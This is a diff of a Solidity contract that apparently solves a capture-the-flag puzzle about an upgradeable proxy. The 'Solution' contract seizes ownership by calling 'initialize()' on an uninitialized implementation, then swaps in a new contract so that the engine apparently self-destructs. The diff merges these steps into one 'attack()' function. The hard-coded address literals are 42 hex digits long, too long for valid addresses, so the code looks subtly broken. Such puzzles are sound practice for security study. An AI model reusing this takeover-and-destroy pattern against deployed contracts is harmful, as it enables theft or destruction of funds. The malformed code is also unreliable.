@@ -104,13 +104,18 @@ contract Engine is Initializable {
 
 // get the implementation address by: await web3.eth.getStorageAt(contractAddr, _IMPLEMENTATION_SLOT)
 contract Solution {
-  address payable currentImplementation = payable(0x00480a8c8f13928d4212b5ed2a6daa8698f3afba29);
+  address payable currentImplementation = payable(0x0013c6306fda8068b2efa596fb88cb1843e07505bc);
 
-  function getOwnership() public {
+  function attack() public {
+    _getOwnership();
+    _changeImplementationAndDestruct();
+  }
+
+  function _getOwnership() private {
     Address.functionCall(currentImplementation, abi.encodeWithSignature("initialize()"));
   }
 
-  function changeImplementationAndDestruct() public {
+  function _changeImplementationAndDestruct() private {
     NewProxy newProxyAddr = new NewProxy();
     Address.functionCall(
       currentImplementation,
